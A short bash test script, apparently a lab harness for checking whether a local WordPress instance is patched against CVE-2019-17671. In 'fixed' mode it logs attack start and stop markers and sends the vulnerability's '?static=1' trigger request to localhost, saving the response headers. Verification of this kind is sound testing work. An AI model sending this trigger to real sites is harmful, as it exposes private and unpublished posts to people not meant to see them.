#!/usr/bin/env bash
set -euo pipefail

CASE_ID="CVE-2019-17671"
MODE="fixed"
TARGET="http://localhost:8082/?static=1"
OUT_DIR="./artifacts"
OUT_FILE="${OUT_DIR}/fixed_response_headers.txt"

mkdir -p "${OUT_DIR}"

echo "[${CASE_ID}] ATTACK_START ${MODE} $(date -Iseconds)"
logger "[${CASE_ID}] ATTACK_START ${MODE}"

curl -s -D "${OUT_FILE}" -o /dev/null "${TARGET}"

echo "[${CASE_ID}] RESPONSE_HEADERS_SAVED=${OUT_FILE}"
grep -i "^X-Static-" "${OUT_FILE}" || true

logger "[${CASE_ID}] ATTACK_STOP ${MODE}"
echo "[${CASE_ID}] ATTACK_STOP ${MODE} $(date -Iseconds)"
